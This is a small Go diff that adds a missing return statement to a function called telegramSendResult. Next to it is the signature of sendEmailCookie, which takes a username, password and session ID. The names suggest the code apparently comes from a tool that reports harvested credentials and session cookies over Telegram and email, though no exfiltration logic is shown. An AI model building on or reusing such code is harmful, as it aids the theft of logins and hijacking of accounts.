@@ -70,7 +70,8 @@ func telegramSendResult(msg string) (bool, error){
 		log.Fatalf("%s", err)
 	}
 	log.Printf("%s", msg)
-
+	// Return
+	return true, nil
 }
 
 func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
